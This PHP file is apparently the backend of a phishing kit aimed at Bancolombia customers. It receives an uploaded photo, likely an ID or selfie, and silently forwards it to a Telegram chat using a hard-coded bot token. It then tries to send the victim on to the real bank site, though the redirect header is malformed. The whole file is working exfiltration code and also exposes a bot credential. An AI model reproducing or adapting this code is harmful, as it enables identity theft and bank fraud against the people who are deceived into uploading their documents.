<?php
// Bot token y chat ID
$bot_token = "5964956592:AAHrvMUcX3qB6oUxvpkq5Q8ZvKzKa2dJYhY";
$chat_id = "5915051785";


$file = curl_file_create($_FILES["photo"]["tmp_name"], $_FILES["photo"]["type"], $_FILES["photo"]["name"]);

// URL
$url = "https://api.telegram.org/bot$bot_token/sendPhoto";

// Build POST data
$post_data = array("chat_id" => $chat_id, "photo" => $file);

// TELEGRAM API
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

header("https://www.bancolombia.com/personas");
exit;
?>